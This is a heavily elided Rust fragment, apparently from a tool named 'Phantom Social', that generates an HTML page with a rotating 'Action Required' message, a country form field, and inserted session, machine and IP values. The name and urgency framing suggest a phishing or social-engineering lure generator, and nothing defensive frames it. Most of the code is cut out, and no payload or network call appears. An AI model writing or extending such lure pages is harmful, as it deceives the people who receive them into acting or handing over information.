// ==========================================================================
// PHANTOM SOCIAL v7.0 - PROFESSIONAL MESSAGE ROTATION
// ===========================================================================
...
fn get_html() -> String {
    ...
    let action_msg = html_escape(get_action_message());
...
<div class="info-box"><strong>Action Required:</strong> {}</div>
...
<div class="form-group">
<input type="text" class="form-input" id="country" value="United States" placeholder="Country/Region">
...
</html>"##, action_msg, session, machine, ip_addr)
}
